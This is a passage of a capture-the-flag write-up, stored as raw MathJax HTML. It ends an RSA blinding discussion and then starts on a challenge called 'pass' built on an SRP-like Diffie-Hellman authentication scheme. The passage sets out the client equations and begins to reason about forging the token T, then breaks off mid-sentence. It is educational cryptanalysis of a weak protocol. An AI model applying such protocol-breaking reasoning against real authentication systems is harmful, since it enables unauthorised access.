id="MathJax-Span-23"><span class="mspace" id="MathJax-Span-24" style="height: 0em; vertical-align: 0em; width: 1em; display: inline-block; overflow: hidden;"></span></span><span class="mi" id="MathJax-Span-25" style="font-family: MathJax_Main; padding-left: 0.167em;">mod</span><span class="mspace" id="MathJax-Span-26" style="height: 0em; vertical-align: 0em; width: 0.167em; display: inline-block; overflow: hidden;"></span><span class="mspace" id="MathJax-Span-27" style="height: 0em; vertical-align: 0em; width: 0.167em; display: inline-block; overflow: hidden;"></span><span class="mi" id="MathJax-Span-28" style="font-family: MathJax_Math; font-style: italic; padding-left: 0.167em;">n</span></span></span><span style="display: inline-block; width: 0px; height: 4.01em;"></span></span><span style="position: absolute; clip: rect(2.951em, 1009em, 4.178em, -1000em); top: -3.259em; left: 0em;"><span class="mtd" id="MathJax-Span-32"><span class="mrow" id="MathJax-Span-33"><span class="mi" id="MathJax-Span-34"></span><span class="mo" id="MathJax-Span-35" style="font-family: MathJax_Main; padding-left: 0.278em;">=</span><span class="msubsup" id="MathJax-Span-36" style="padding-left: 0.278em;"><span style="display: inline-block; position: relative; width: 0.878em; height: 0px;"><span style="position: absolute; clip: rect(3.412em, 1000.43em, 4.178em, -1000em); top: -4.01em; left: 0em;"><span class="mi" id="MathJax-Span-37" style="font-family: MathJax_Math; font-style: italic;">c</span><span style="display: inline-block; width: 0px; height: 4.01em;"></span></span><span style="position: absolute; top: -4.423em; left: 0.433em;"><span class="mi" id="MathJax-Span-38" style="font-size: 70.7%; font-family: MathJax_Math; font-style: italic;">d<span style="display: inline-block; overflow: hidden; height: 1px; width: 0.002em;"></span></span><span style="display: inline-block; width: 0px; height: 4.01em;"></span></span></span></span><span class="mo" id="MathJax-Span-39" style="font-family: MathJax_Main; padding-left: 0.222em;">×</span><span class="msubsup" id="MathJax-Span-40" style="padding-left: 0.222em;"><span style="display: inline-block; position: relative; width: 1.43em; height: 0px;"><span style="position: absolute; clip: rect(3.412em, 1000.43em, 4.178em, -1000em); top: -4.01em; left: 0em;"><span class="mi" id="MathJax-Span-41" style="font-family: MathJax_Math; font-style: italic;">r</span><span style="display: inline-block; width: 0px; height: 4.01em;"></span></span><span style="position: absolute; top: -4.423em; left: 0.451em;"><span class="texatom" id="MathJax-Span-42"><span class="mrow" id="MathJax-Span-43"><span class="mo" id="MathJax-Span-44" style="font-size: 70.7%; font-family: MathJax_Main;">−</span><span class="mn" id="MathJax-Span-45" style="font-size: 70.7%; font-family: MathJax_Main;">1</span></span></span><span style="display: inline-block; width: 0px; height: 4.01em;"></span></span></span></span><span class="TeXmathchoice" id="MathJax-Span-46"><span class="mspace" id="MathJax-Span-47" style="height: 0em; vertical-align: 0em; width: 1em; display: inline-block; overflow: hidden;"></span></span><span class="mi" id="MathJax-Span-48" style="font-family: MathJax_Main; padding-left: 0.167em;">mod</span><span class="mspace" id="MathJax-Span-49" style="height: 0em; vertical-align: 0em; width: 0.167em; display: inline-block; overflow: hidden;"></span><span class="mspace" id="MathJax-Span-50" style="height: 0em; vertical-align: 0em; width: 0.167em; display: inline-block; overflow: hidden;"></span><span class="mi" id="MathJax-Span-51" style="font-family: MathJax_Math; font-style: italic; padding-left: 0.167em;">n</span></span></span><span style="display: inline-block; width: 0px; height: 4.01em;"></span></span></span><span style="display: inline-block; width: 0px; height: 4.01em;"></span></span></span></span></span><span style="display: inline-block; width: 0px; height: 2.188em;"></span></span></span><span style="display: inline-block; overflow: hidden; vertical-align: -1.205em; border-left: 0px solid; width: 0px; height: 3.009em;"></span></span></nobr><span class="MJX_Assistive_MathML MJX_Assistive_MathML_Block" role="presentation"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><mtable columnalign="right left right left right left right left right left right left" rowspacing="3pt" columnspacing="0em 2em 0em 2em 0em 2em 0em 2em 0em 2em 0em" displaystyle="true"><mtr><mtd><mi>c</mi></mtd><mtd><mi></mi><mo>=</mo><msup><mi>m</mi><mi>e</mi></msup><mo>×</mo><msup><mi>r</mi><mi>e</mi></msup><mspace width="1em"></mspace><mi>mod</mi><mspace width="thinmathspace"></mspace><mspace width="thinmathspace"></mspace><mi>n</mi></mtd></mtr><mtr><mtd><mi>m</mi></mtd><mtd><mi></mi><mo>=</mo><msup><mi>c</mi><mi>d</mi></msup><mo>×</mo><msup><mi>r</mi><mrow class="MJX-TeXAtom-ORD"><mo>−</mo><mn>1</mn></mrow></msup><mspace width="1em"></mspace><mi>mod</mi><mspace width="thinmathspace"></mspace><mspace width="thinmathspace"></mspace><mi>n</mi></mtd></mtr></mtable></math></span></span></div><script type="math/tex; mode=display" id="MathJax-Element-2">  
-\begin{align}  
-c &= m^e \times r^e \mod n \\  
-m &= c^d \times r^{-1} \mod n  
-\end{align}
-</script></span></p><h3 id="pass-sasdf" style=""><a class="anchor hidden-xs" href="#pass-sasdf" title="pass-sasdf"><span class="octicon octicon-link"></span></a>pass (sasdf)</h3><p>Typically, crypto challenge without source or binary is a sign or bad guessing challenge, which takes a lot of time to guess and then solved by trival techniques :(</p><h4 id="Authentication-scheme"><a class="anchor hidden-xs" href="#Authentication-scheme" title="Authentication-scheme"><span class="octicon octicon-link"></span></a>Authentication scheme</h4><p>This challenge is about an authentication service using some diffie-hellman variant. Authentication scheme on the client side is:<br>
-<span class="mathjax"><span class="MathJax_Preview" style="color: inherit; display: none;"></span><div class="MathJax_Display" style="text-align: center;"><span class="MathJax" id="MathJax-Element-3-Frame" tabindex="0" style="text-align: center; position: relative;" data-mathml="<math xmlns=&quot;http://www.w3.org/1998/Math/MathML&quot; display=&quot;block&quot;><mtable columnalign=&quot;right left right left right left right left right left right left&quot; rowspacing=&quot;3pt&quot; columnspacing=&quot;0em 2em 0em 2em 0em 2em 0em 2em 0em 2em 0em&quot; displaystyle=&quot;true&quot;><mtr><mtd><mi>a</mi></mtd><mtd><mi></mi><mo>=</mo><mtext>rand</mtext><mo stretchy=&quot;false&quot;>(</mo><mtext>seed</mtext><mo stretchy=&quot;false&quot;>)</mo></mtd></mtr><mtr><mtd><mi>A</mi></mtd><mtd><mi></mi><mo>=</mo><msup><mi>g</mi><mi>a</mi></msup><mspace width=&quot;1em&quot; /><mi>mod</mi><mspace width=&quot;thinmathspace&quot; /><mspace width=&quot;thinmathspace&quot; /><mi>N</mi></mtd></mtr><mtr><mtd /><mtd><mtext>send A, recv B</mtext></mtd></mtr><mtr><mtd><mi>x</mi></mtd><mtd><mi></mi><mo>=</mo><mtext>password</mtext></mtd></mtr><mtr><mtd><mi>S</mi></mtd><mtd><mi></mi><mo>=</mo><mi>B</mi><mo>&amp;#x2212;</mo><mn>3</mn><mo>&amp;#x00D7;</mo><mo stretchy=&quot;false&quot;>(</mo><msup><mi>g</mi><mi>x</mi></msup><mspace width=&quot;1em&quot; /><mi>mod</mi><mspace width=&quot;thinmathspace&quot; /><mspace width=&quot;thinmathspace&quot; /><mi>N</mi><mo stretchy=&quot;false&quot;>)</mo></mtd></mtr><mtr><mtd><mi>u</mi></mtd><mtd><mi></mi><mo>=</mo><mtext>sha256</mtext><mo stretchy=&quot;false&quot;>(</mo><mi>A</mi><mo>+</mo><mi>B</mi><mo stretchy=&quot;false&quot;>)</mo></mtd></mtr><mtr><mtd><mi>T</mi></mtd><mtd><mi></mi><mo>=</mo><msup><mi>S</mi><mrow class=&quot;MJX-TeXAtom-ORD&quot;><mi>a</mi><mo>+</mo><mi>u</mi><mi>x</mi></mrow></msup><mo>=</mo><msup><mi>S</mi><mi>a</mi></msup><mo>&amp;#x00D7;</mo><msup><mi>S</mi><mrow class=&quot;MJX-TeXAtom-ORD&quot;><mi>u</mi><mi>x</mi></mrow></msup><mspace width=&quot;1em&quot; /><mi>mod</mi><mspace width=&quot;thinmathspace&quot; /><mspace width=&quot;thinmathspace&quot; /><mi>N</mi></mtd></mtr><mtr><mtd /><mtd><mtext>authenticate using T</mtext></mtd></mtr></mtable></math>" role="presentation"><nobr aria-hidden="true"><span class="math" id="MathJax-Span-52" style="width: 17.659em; display: inline-block;"><span style="display: inline-block; position: relative; width: 14.688em; height: 0px; font-size: 120%;"><span style="position: absolute; clip: rect(-3.362em, 1014.52em, 7.237em, -1000em); top: -2.188em; left: 0em;"><span class="mrow" id="MathJax-Span-53"><span class="mtable" id="MathJax-Span-54" style="padding-right: 0.167em; padding-left: 0.167em;"><span style="display: inline-block; position: relative; width: 14.339em; height: 0px;"><span style="position: absolute; clip: rect(5.539em, 1000.73em, 15.572em, -1000em); top: -10.729em; left: 0em;"><span style="display: inline-block; position: relative; width: 0.75em; height: 0px;"><span style="position: absolute; clip: rect(3.413em, 1000.51em, 4.177em, -1000em); top: -8.603em; right: 0em;"><span class="mtd" id="MathJax-Span-55"><span class="mrow" id="MathJax-Span-56"><span class="mi" id="MathJax-Span-57" style="font-family: MathJax_Math; font-style: italic;">a</span></span></span><span style="display: inline-block; width: 0px; height: 4.01em;"></span></span><span style="position: absolute; clip: rect(3.138em, 1000.73em, 4.167em, -1000em); top: -7.253em; right: 0em;"><span class="mtd" id="MathJax-Span-66"><span class="mrow" id="MathJax-Span-67"><span class="mi" id="MathJax-Span-68" style="font-family: MathJax_Math; font-style: italic;">A</span></span></span><span style="display: inline-block; width: 0px; height: 4.01em;"></span></span><span style="position: absolute; clip: rect(3.854em, 1000em, 4.167em, -1000em); top: -5.948em; right: 0em;"><span class="mtd" id="MathJax-Span-82"><span class="mrow" id="MathJax-Span-83"></span></span><span style="display: inline-block; width: 0px; height: 4.01em;"></span></span><span style="position: absolute; clip: rect(3.412em, 1000.52em, 4.178em, -1000em); top: -4.648em; right: 0em;"><span class="mtd" id="MathJax-Span-87"><span class="mrow" id="MathJax-Span-88"><span class="mi" id="MathJax-Span-89" style="font-family: MathJax_Math; font-style: italic;">x</span></span></span><span style="display: inline-block; width: 0px; height: 4.01em;"></span></span><span style="position: absolute; clip: rect(3.149em, 1000.65em, 4.189em, -1000em); top: -3.348em; right: 0em;"><span class="mtd" id="MathJax-Span-95"><span class="mrow" id="MathJax-Span-96"><span class="mi" id="MathJax-Span-97" style="font-family: MathJax_Math; font-style: italic;">S<span style="display: inline-block; overflow: hidden; height: 1px; width: 0.032em;"></span></span></span></span><span style="display: inline-block; width: 0px; height: 4.01em;"></span></span><span style="position: absolute; clip: rect(3.412em, 1000.55em, 4.178em, -1000em); top: -1.998em; right: 0em;"><span class="mtd" id="MathJax-Span-117"><span class="mrow" id="MathJax-Span-118"><span class="mi" id="MathJax-Span-119" style="font-family: MathJax_Math; font-style: italic;">u</span></span></span><span style="display: inline-block; width: 0px; height: 4.01em;"></span></span><span style="position: absolute; clip: rect(3.177em, 1000.7em, 4.167em, -1000em); top: -0.623em; right: 0em;"><span class="mtd" id="MathJax-Span-130"><span class="mrow" id="MathJax-Span-131"><span class="mi" id="MathJax-Span-132" style="font-family: MathJax_Math; font-style: italic;">T<span style="display: inline-block; overflow: hidden; height: 1px; width: 0.12em;"></span></span></span></span><span style="display: inline-block; width: 0px; height: 4.01em;"></span></span><span style="position: absolute; clip: rect(3.854em, 1000em, 4.167em, -1000em); top: 0.677em; right: 0em;"><span class="mtd" id="MathJax-Span-162"><span class="mrow" id="MathJax-Span-163"></span></span><span style="display: inline-block; width: 0px; height: 4.01em;"></span></span></span><span style="display: inline-block; width: 0px; height: 10.729em;"></span></span><span style="position: absolute; clip: rect(5.751em, 1013.59em, 16.299em, -1000em); top: -11.25em; left: 0.75em;"><span style="display: inline-block; position: relative; width: 13.589em; height: 0px;"><span style="position: absolute; clip: rect(3.104em, 1005.86em, 4.417em, -1000em); top: -8.603em; left: 0em;"><span class="mtd" id="MathJax-Span-58"><span class="mrow" id="MathJax-Span-59"><span class="mi" id="MathJax-Span-60"></span><span class="mo" id="MathJax-Span-61" style="font-family: MathJax_Main; padding-left: 0.278em;">=</span><span class="mtext" id="MathJax-Span-62" style="font-family: MathJax_Main; padding-left: 0.278em;">rand</span><span class="mo" id="MathJax-Span-63" style="font-family: MathJax_Main;">(</span><span class="mtext" id="MathJax-Span-64" style="font-family: MathJax_Main;">seed</span><span class="mo" id="MathJax-Span-65" style="font-family: MathJax_Main;">)</span></span></span><span style="display: inline-block; width: 0px; height: 4.01em;"></span></span><span style="position: absolute; clip: rect(3.129em, 1006.76em, 4.372em, -1000em); top: -7.253em; left: 0em;"><span class="mtd" id="MathJax-Span-69"><span class="mrow" id="MathJax-Span-70"><span class="mi" id="MathJax-Span-71"></span><span class="mo" id="MathJax-Span-72" style="font-family: MathJax_Main; padding-left: 0.278em;">=</span><span class="msubsup" id="MathJax-Span-73" style="padding-left: 0.278em;"><span style="display: inline-block; position: relative; width: 0.98em; height: 0px;"><span style="position: absolute; clip: rect(3.412em, 1000.48em, 4.372em, -1000em); top: -4.01em; left: 0em;"><span class="mi" id="MathJax-Span-74" style="font-family: MathJax_Math; font-style: italic;">g<span style="display: inline-block; overflow: hidden; height: 1px; width: 0.003em;"></span></span><span style="display: inline-block; width: 0px; height: 4.01em;"></span></span><span style="position: absolute; top: -4.423em; left: 0.531em;"><span class="mi" id="MathJax-Span-75" style="font-size: 70.7%; font-family: MathJax_Math; font-style: italic;">a</span><span style="display: inline-block; width: 0px; height: 4.01em;"></span></span></span></span><span class="TeXmathchoice" id="MathJax-Span-76"><span class="mspace" id="MathJax-Span-77" style="height: 0em; vertical-align: 0em; width: 1em; display: inline-block; overflow: hidden;"></span></span><span class="mi" id="MathJax-Span-78" style="font-family: MathJax_Main; padding-left: 0.167em;">mod</span><span class="mspace" id="MathJax-Span-79" style="height: 0em; vertical-align: 0em; width: 0.167em; display: inline-block; overflow: hidden;"></span><span class="mspace" id="MathJax-Span-80" style="height: 0em; vertical-align: 0em; width: 0.167em; display: inline-block; overflow: hidden;"></span><span class="mi" id="MathJax-Span-81" style="font-family: MathJax_Math; font-style: italic; padding-left: 0.167em;">N<span style="display: inline-block; overflow: hidden; height: 1px; width: 0.085em;"></span></span></span></span><span style="display: inline-block; width: 0px; height: 4.01em;"></span></span><span style="position: absolute; clip: rect(3.138em, 1006.19em, 4.361em, -1000em); top: -5.948em; left: 0em;"><span class="mtd" id="MathJax-Span-84"><span class="mrow" id="MathJax-Span-85"><span class="mtext" id="MathJax-Span-86" style="font-family: MathJax_Main;">send A, recv B</span></span></span><span style="display: inline-block; width: 0px; height: 4.01em;"></span></span><span style="position: absolute; clip: rect(3.16em, 1005.33em, 4.361em, -1000em); top: -4.648em; left: 0em;"><span class="mtd" id="MathJax-Span-90"><span class="mrow" id="MathJax-Span-91"><span class="mi" id="MathJax-Span-92"></span><span class="mo" id="MathJax-Span-93" style="font-family: MathJax_Main; padding-left: 0.278em;">=</span><span class="mtext" id="MathJax-Span-94" style="font-family: MathJax_Main; padding-left: 0.278em;">password</span></span></span><span style="display: inline-block; width: 0px; height: 4.01em;"></span></span><span style="position: absolute; clip: rect(3.104em, 1011.18em, 4.417em, -1000em); top: -3.348em; left: 0em;"><span class="mtd" id="MathJax-Span-98"><span class="mrow" id="MathJax-Span-99"><span class="mi" id="MathJax-Span-100"></span><span class="mo" id="MathJax-Span-101" style="font-family: MathJax_Main; padding-left: 0.278em;">=</span><span class="mi" id="MathJax-Span-102" style="font-family: MathJax_Math; font-style: italic; padding-left: 0.278em;">B</span><span class="mo" id="MathJax-Span-103" style="font-family: MathJax_Main; padding-left: 0.222em;">−</span><span class="mn" id="MathJax-Span-104" style="font-family: MathJax_Main; padding-left: 0.222em;">3</span><span class="mo" id="MathJax-Span-105" style="font-family: MathJax_Main; padding-left: 0.222em;">×</span><span class="mo" id="MathJax-Span-106" style="font-family: MathJax_Main; padding-left: 0.222em;">(</span><span class="msubsup" id="MathJax-Span-107"><span style="display: inline-block; position: relative; width: 1.01em; height: 0px;"><span style="position: absolute; clip: rect(3.412em, 1000.48em, 4.372em, -1000em); top: -4.01em; left: 0em;"><span class="mi" id="MathJax-Span-108" style="font-family: MathJax_Math; font-style: italic;">g<span style="display: inline-block; overflow: hidden; height: 1px; width: 0.003em;"></span></span><span style="display: inline-block; width: 0px; height: 4.01em;"></span></span><span style="position: absolute; top: -4.423em; left: 0.531em;"><span class="mi" id="MathJax-Span-109" style="font-size: 70.7%; font-family: MathJax_Math; font-style: italic;">x</span><span style="display: inline-block; width: 0px; height: 4.01em;"></span></span></span></span><span class="TeXmathchoice" id="MathJax-Span-110"><span class="mspace" id="MathJax-Span-111" style="height: 0em; vertical-align: 0em; width: 1em; display: inline-block; overflow: hidden;"></span></span><span class="mi" id="MathJax-Span-112" style="font-family: MathJax_Main; padding-left: 0.167em;">mod</span><span class="mspace" id="MathJax-Span-113" style="height: 0em; vertical-align: 0em; width: 0.167em; display: inline-block; overflow: hidden;"></span><span class="mspace" id="MathJax-Span-114" style="height: 0em; vertical-align: 0em; width: 0.167em; display: inline-block; overflow: hidden;"></span><span class="mi" id="MathJax-Span-115" style="font-family: MathJax_Math; font-style: italic; padding-left: 0.167em;">N<span style="display: inline-block; overflow: hidden; height: 1px; width: 0.085em;"></span></span><span class="mo" id="MathJax-Span-116" style="font-family: MathJax_Main;">)</span></span></span><span style="display: inline-block; width: 0px; height: 4.01em;"></span></span><span style="position: absolute; clip: rect(3.104em, 1007.7em, 4.417em, -1000em); top: -1.998em; left: 0em;"><span class="mtd" id="MathJax-Span-120"><span class="mrow" id="MathJax-Span-121"><span class="mi" id="MathJax-Span-122"></span><span class="mo" id="MathJax-Span-123" style="font-family: MathJax_Main; padding-left: 0.278em;">=</span><span class="mtext" id="MathJax-Span-124" style="font-family: MathJax_Main; padding-left: 0.278em;">sha256</span><span class="mo" id="MathJax-Span-125" style="font-family: MathJax_Main;">(</span><span class="mi" id="MathJax-Span-126" style="font-family: MathJax_Math; font-style: italic;">A</span><span class="mo" id="MathJax-Span-127" style="font-family: MathJax_Main; padding-left: 0.222em;">+</span><span class="mi" id="MathJax-Span-128" style="font-family: MathJax_Math; font-style: italic; padding-left: 0.222em;">B</span><span class="mo" id="MathJax-Span-129" style="font-family: MathJax_Main;">)</span></span></span><span style="display: inline-block; width: 0px; height: 4.01em;"></span></span><span style="position: absolute; clip: rect(3.029em, 1013.59em, 4.189em, -1000em); top: -0.623em; left: 0em;"><span class="mtd" id="MathJax-Span-133"><span class="mrow" id="MathJax-Span-134"><span class="mi" id="MathJax-Span-135"></span><span class="mo" id="MathJax-Span-136" style="font-family: MathJax_Main; padding-left: 0.278em;">=</span><span class="msubsup" id="MathJax-Span-137" style="padding-left: 0.278em;"><span style="display: inline-block; position: relative; width: 2.513em; height: 0px;"><span style="position: absolute; clip: rect(3.149em, 1000.65em, 4.189em, -1000em); top: -4.01em; left: 0em;"><span class="mi" id="MathJax-Span-138" style="font-family: MathJax_Math; font-style: italic;">S<span style="display: inline-block; overflow: hidden; height: 1px; width: 0.032em;"></span></span><span style="display: inline-block; width: 0px; height: 4.01em;"></span></span><span style="position: absolute; top: -4.423em; left: 0.705em;"><span class="texatom" id="MathJax-Span-139"><span class="mrow" id="MathJax-Span-140"><span class="mi" id="MathJax-Span-141" style="font-size: 70.7%; font-family: MathJax_Math; font-style: italic;">a</span><span class="mo" id="MathJax-Span-142" style="font-size: 70.7%; font-family: MathJax_Main;">+</span><span class="mi" id="MathJax-Span-143" style="font-size: 70.7%; font-family: MathJax_Math; font-style: italic;">u</span><span class="mi" id="MathJax-Span-144" style="font-size: 70.7%; font-family: MathJax_Math; font-style: italic;">x</span></span></span><span style="display: inline-block; width: 0px; height: 4.01em;"></span></span></span></span><span class="mo" id="MathJax-Span-145" style="font-family: MathJax_Main; padding-left: 0.278em;">=</span><span class="msubsup" id="MathJax-Span-146" style="padding-left: 0.278em;"><span style="display: inline-block; position: relative; width: 1.154em; height: 0px;"><span style="position: absolute; clip: rect(3.149em, 1000.65em, 4.189em, -1000em); top: -4.01em; left: 0em;"><span class="mi" id="MathJax-Span-147" style="font-family: MathJax_Math; font-style: italic;">S<span style="display: inline-block; overflow: hidden; height: 1px; width: 0.032em;"></span></span><span style="display: inline-block; width: 0px; height: 4.01em;"></span></span><span style="position: absolute; top: -4.423em; left: 0.705em;"><span class="mi" id="MathJax-Span-148" style="font-size: 70.7%; font-family: MathJax_Math; font-style: italic;">a</span><span style="display: inline-block; width: 0px; height: 4.01em;"></span></span></span></span><span class="mo" id="MathJax-Span-149" style="font-family: MathJax_Main; padding-left: 0.222em;">×</span><span class="msubsup" id="MathJax-Span-150" style="padding-left: 0.222em;"><span style="display: inline-block; position: relative; width: 1.589em; height: 0px;"><span style="position: absolute; clip: rect(3.149em, 1000.65em, 4.189em, -1000em); top: -4.01em; left: 0em;"><span class="mi" id="MathJax-Span-151" style="font-family: MathJax_Math; font-style: italic;">S<span style="display: inline-block; overflow: hidden; height: 1px; width: 0.032em;"></span></span><span style="display: inline-block; width: 0px; height: 4.01em;"></span></span><span style="position: absolute; top: -4.423em; left: 0.705em;"><span class="texatom" id="MathJax-Span-152"><span class="mrow" id="MathJax-Span-153"><span class="mi" id="MathJax-Span-154" style="font-size: 70.7%; font-family: MathJax_Math; font-style: italic;">u</span><span class="mi" id="MathJax-Span-155" style="font-size: 70.7%; font-family: MathJax_Math; font-style: italic;">x</span></span></span><span style="display: inline-block; width: 0px; height: 4.01em;"></span></span></span></span><span class="TeXmathchoice" id="MathJax-Span-156"><span class="mspace" id="MathJax-Span-157" style="height: 0em; vertical-align: 0em; width: 1em; display: inline-block; overflow: hidden;"></span></span><span class="mi" id="MathJax-Span-158" style="font-family: MathJax_Main; padding-left: 0.167em;">mod</span><span class="mspace" id="MathJax-Span-159" style="height: 0em; vertical-align: 0em; width: 0.167em; display: inline-block; overflow: hidden;"></span><span class="mspace" id="MathJax-Span-160" style="height: 0em; vertical-align: 0em; width: 0.167em; display: inline-block; overflow: hidden;"></span><span class="mi" id="MathJax-Span-161" style="font-family: MathJax_Math; font-style: italic; padding-left: 0.167em;">N<span style="display: inline-block; overflow: hidden; height: 1px; width: 0.085em;"></span></span></span></span><span style="display: inline-block; width: 0px; height: 4.01em;"></span></span><span style="position: absolute; clip: rect(3.16em, 1008.91em, 4.373em, -1000em); top: 0.677em; left: 0em;"><span class="mtd" id="MathJax-Span-164"><span class="mrow" id="MathJax-Span-165"><span class="mtext" id="MathJax-Span-166" style="font-family: MathJax_Main;">authenticate using T</span></span></span><span style="display: inline-block; width: 0px; height: 4.01em;"></span></span></span><span style="display: inline-block; width: 0px; height: 11.25em;"></span></span></span></span></span><span style="display: inline-block; width: 0px; height: 2.188em;"></span></span></span><span style="display: inline-block; overflow: hidden; vertical-align: -5.934em; border-left: 0px solid; width: 0px; height: 12.468em;"></span></span></nobr><span class="MJX_Assistive_MathML MJX_Assistive_MathML_Block" role="presentation"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><mtable columnalign="right left right left right left right left right left right left" rowspacing="3pt" columnspacing="0em 2em 0em 2em 0em 2em 0em 2em 0em 2em 0em" displaystyle="true"><mtr><mtd><mi>a</mi></mtd><mtd><mi></mi><mo>=</mo><mtext>rand</mtext><mo stretchy="false">(</mo><mtext>seed</mtext><mo stretchy="false">)</mo></mtd></mtr><mtr><mtd><mi>A</mi></mtd><mtd><mi></mi><mo>=</mo><msup><mi>g</mi><mi>a</mi></msup><mspace width="1em"></mspace><mi>mod</mi><mspace width="thinmathspace"></mspace><mspace width="thinmathspace"></mspace><mi>N</mi></mtd></mtr><mtr><mtd></mtd><mtd><mtext>send A, recv B</mtext></mtd></mtr><mtr><mtd><mi>x</mi></mtd><mtd><mi></mi><mo>=</mo><mtext>password</mtext></mtd></mtr><mtr><mtd><mi>S</mi></mtd><mtd><mi></mi><mo>=</mo><mi>B</mi><mo>−</mo><mn>3</mn><mo>×</mo><mo stretchy="false">(</mo><msup><mi>g</mi><mi>x</mi></msup><mspace width="1em"></mspace><mi>mod</mi><mspace width="thinmathspace"></mspace><mspace width="thinmathspace"></mspace><mi>N</mi><mo stretchy="false">)</mo></mtd></mtr><mtr><mtd><mi>u</mi></mtd><mtd><mi></mi><mo>=</mo><mtext>sha256</mtext><mo stretchy="false">(</mo><mi>A</mi><mo>+</mo><mi>B</mi><mo stretchy="false">)</mo></mtd></mtr><mtr><mtd><mi>T</mi></mtd><mtd><mi></mi><mo>=</mo><msup><mi>S</mi><mrow class="MJX-TeXAtom-ORD"><mi>a</mi><mo>+</mo><mi>u</mi><mi>x</mi></mrow></msup><mo>=</mo><msup><mi>S</mi><mi>a</mi></msup><mo>×</mo><msup><mi>S</mi><mrow class="MJX-TeXAtom-ORD"><mi>u</mi><mi>x</mi></mrow></msup><mspace width="1em"></mspace><mi>mod</mi><mspace width="thinmathspace"></mspace><mspace width="thinmathspace"></mspace><mi>N</mi></mtd></mtr><mtr><mtd></mtd><mtd><mtext>authenticate using T</mtext></mtd></mtr></mtable></math></span></span></div><script type="math/tex; mode=display" id="MathJax-Element-3">  
-\begin{align}  
-a &= \text{rand}(\text{seed}) \\  
-A &= g^a \mod N \\  
-&\text{send A, recv B} \\  
-x &= \text{password} \\  
-S &= B - 3 \times (g^x \mod N) \\  
-u &= \text{sha256}(A+B) \\  
-T &= S^{a + ux} = S^a \times S^{ux} \mod N \\  
-&\text{authenticate using T} 
-\end{align}
-</script></span><br>
-The service needs to verify our token T is correct, it knows <span class="mathjax"><span class="MathJax_Preview" style="color: inherit; display: none;"></span><span class="MathJax" id="MathJax-Element-4-Frame" tabindex="0" style="position: relative;" data-mathml="<math xmlns=&quot;http://www.w3.org/1998/Math/MathML&quot;><mi>A</mi><mo>,</mo><mi>B</mi><mo>,</mo><mi>S</mi><mo>,</mo><mi>x</mi><mo>,</mo><mi>u</mi></math>" role="presentation"><nobr aria-hidden="true"><span class="math" id="MathJax-Span-167" style="width: 6.044em; display: inline-block;"><span style="display: inline-block; position: relative; width: 5em; height: 0px; font-size: 120%;"><span style="position: absolute; clip: rect(1.419em, 1004.98em, 2.642em, -1000em); top: -2.292em; left: 0em;"><span class="mrow" id="MathJax-Span-168"><span class="mi" id="MathJax-Span-169" style="font-family: MathJax_Math; font-style: italic;">A</span><span class="mo" id="MathJax-Span-170" style="font-family: MathJax_Main;">,</span><span class="mi" id="MathJax-Span-171" style="font-family: MathJax_Math; font-style: italic; padding-left: 0.167em;">B</span><span class="mo" id="MathJax-Span-172" style="font-family: MathJax_Main;">,</span><span class="mi" id="MathJax-Span-173" style="font-family: MathJax_Math; font-style: italic; padding-left: 0.167em;">S<span style="display: inline-block; overflow: hidden; height: 1px; width: 0.032em;"></span></span><span class="mo" id="MathJax-Span-174" style="font-family: MathJax_Main;">,</span><span class="mi" id="MathJax-Span-175" style="font-family: MathJax_Math; font-style: italic; padding-left: 0.167em;">x</span><span class="mo" id="MathJax-Span-176" style="font-family: MathJax_Main;">,</span><span class="mi" id="MathJax-Span-177" style="font-family: MathJax_Math; font-style: italic; padding-left: 0.167em;">u</span></span><span style="display: inline-block; width: 0px; height: 2.292em;"></span></span></span><span style="display: inline-block; overflow: hidden; vertical-align: -0.295em; border-left: 0px solid; width: 0px; height: 1.217em;"></span></span></nobr><span class="MJX_Assistive_MathML" role="presentation"><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>A</mi><mo>,</mo><mi>B</mi><mo>,</mo><mi>S</mi><mo>,</mo><mi>x</mi><mo>,</mo><mi>u</mi></math></span></span><script type="math/tex" id="MathJax-Element-4">A, B, S, x, u</script></span>, so it’s trival to generate <span class="mathjax"><span class="MathJax_Preview" style="color: inherit; display: none;"></span><span class="MathJax" id="MathJax-Element-5-Frame" tabindex="0" style="position: relative;" data-mathml="<math xmlns=&quot;http://www.w3.org/1998/Math/MathML&quot;><msup><mi>S</mi><mrow class=&quot;MJX-TeXAtom-ORD&quot;><mi>u</mi><mi>x</mi></mrow></msup></math>" role="presentation"><nobr aria-hidden="true"><span class="math" id="MathJax-Span-178" style="width: 1.982em; display: inline-block;"><span style="display: inline-block; position: relative; width: 1.615em; height: 0px; font-size: 120%;"><span style="position: absolute; clip: rect(1.326em, 1001.62em, 2.366em, -1000em); top: -2.188em; left: 0em;"><span class="mrow" id="MathJax-Span-179"><span class="msubsup" id="MathJax-Span-180"><span style="display: inline-block; position: relative; width: 1.589em; height: 0px;"><span style="position: absolute; clip: rect(3.149em, 1000.65em, 4.189em, -1000em); top: -4.01em; left: 0em;"><span class="mi" id="MathJax-Span-181" style="font-family: MathJax_Math; font-style: italic;">S<span style="display: inline-block; overflow: hidden; height: 1px; width: 0.032em;"></span></span><span style="display: inline-block; width: 0px; height: 4.01em;"></span></span><span style="position: absolute; top: -4.373em; left: 0.705em;"><span class="texatom" id="MathJax-Span-182"><span class="mrow" id="MathJax-Span-183"><span class="mi" id="MathJax-Span-184" style="font-size: 70.7%; font-family: MathJax_Math; font-style: italic;">u</span><span class="mi" id="MathJax-Span-185" style="font-size: 70.7%; font-family: MathJax_Math; font-style: italic;">x</span></span></span><span style="display: inline-block; width: 0px; height: 4.01em;"></span></span></span></span></span><span style="display: inline-block; width: 0px; height: 2.188em;"></span></span></span><span style="display: inline-block; overflow: hidden; vertical-align: -0.089em; border-left: 0px solid; width: 0px; height: 0.997em;"></span></span></nobr><span class="MJX_Assistive_MathML" role="presentation"><math xmlns="http://www.w3.org/1998/Math/MathML"><msup><mi>S</mi><mrow class="MJX-TeXAtom-ORD"><mi>u</mi><mi>x</mi></mrow></msup></math></span></span><script type="math/tex" id="MathJax-Element-5">S^{ux}</script></span> but not <span class="mathjax"><span class="MathJax_Preview" style="color: inherit; display: none;"></span><span class="MathJax" id="MathJax-Element-6-Frame" tabindex="0" style="position: relative;" data-mathml="<math xmlns=&quot;http://www.w3.org/1998/Math/MathML&quot;><msup><mi>S</mi><mi>a</mi></msup></math>" role="presentation"><nobr aria-hidden="true"><span class="math" id="MathJax-Span-186" style="width: 1.409em; display: inline-block;"><span 